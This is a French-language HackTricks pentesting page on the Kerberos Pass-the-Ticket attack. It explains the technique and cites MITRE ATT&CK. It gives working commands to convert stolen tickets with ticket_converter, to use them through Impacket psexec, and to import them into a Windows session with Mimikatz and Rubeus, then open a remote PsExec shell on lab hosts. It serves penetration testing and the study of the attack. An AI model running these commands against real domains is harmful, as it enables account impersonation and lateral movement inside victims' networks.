# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

Dans une attaque Pass-the-Ticket (PtT), un adversaire utilise un ticket Kerberos volé pour s'authentifier en tant que principal du ticket sans posséder le mot de passe de ce compte. Un ticket-granting ticket (TGT) peut être utilisé pour demander des tickets de service, tandis qu'un ticket de service volé est limité à son service cible et à sa période de validité.<sup>[[1]](#references)</sup>

Pour les techniques d'acquisition de tickets, voir :

- [Collecte de tickets depuis Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Collecte de tickets depuis Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Conversion des formats de tickets Linux et Windows

Les caches Kerberos apparaissent généralement sous forme de fichiers MIT `ccache` sur Linux et de fichiers `.kirbi` sur Windows. `ticket_converter` convertit ces formats à l'aide d'un ticket d'entrée et d'un chemin de sortie.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo fournit également des outils Kerberos pour les tickets sous Windows.<sup>[[3]](#references)</sup>

## Utiliser un ticket

Sous Linux, définissez `KRB5CCNAME` sur le cache et indiquez à un client Impacket d'utiliser Kerberos sans demander de mot de passe :<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Sous Windows, Mimikatz ou Rubeus peuvent importer un ticket `.kirbi` dans la session de connexion actuelle. Utilisez `klist` pour inspecter le cache résultant.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
L’importation d’un ticket n’accorde pas de privilèges autres que ceux représentés par le ticket et la politique d’autorisation du service cible. Les tickets expirés, révoqués, malformés ou dont la portée est incorrecte peuvent échouer.<sup>[[1]](#references)</sup>

Pour obtenir un contexte plus large sur les attaques Kerberos et les techniques associées d’acquisition de tickets, consultez le guide des attaques Kerberos de Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - exemples d’Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - techniques d’attaque Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
